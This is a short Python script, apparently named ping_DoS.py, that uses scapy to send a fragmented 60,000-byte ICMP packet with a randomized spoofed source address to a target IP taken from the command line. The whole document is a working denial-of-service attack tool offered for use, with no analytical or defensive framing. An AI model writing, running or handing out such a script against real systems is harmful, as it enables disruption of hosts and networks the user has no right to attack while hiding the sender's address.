from scapy.all import *
from argparse import ArgumentParser
import socket

# Specify Command Line Arguments
parser = ArgumentParser()
parser.add_argument('--target-ip', '-t', help='Target IP address')
parser.epilog = "Usage: python ping_DoS.py -t <IP Address>"        
args = parser.parse_args()

try:
  socket.inet_aton(args.target_ip) # Checks if it's a legal IP.
  
  if args.target_ip is not None: # Checks if argument is not empty
            
    target_ip = args.target_ip 
    
    ip = IP(src=RandIP("192.168.0.0/16"), dst=target_ip) # Randomize Source IP, specify destination target's IP
    icmp = ICMP()
    packet = 'X'*60000 # Sends a malicious packet of large size.
    
    send(fragment(ip/icmp/packet))
   
except:
  print('[-]Please, use --target-ip or -t to set a Target IP Address!')
  print('[!]Example: -t 10.20.30.40')
  print('[?] -h for help')
  exit()

exit()
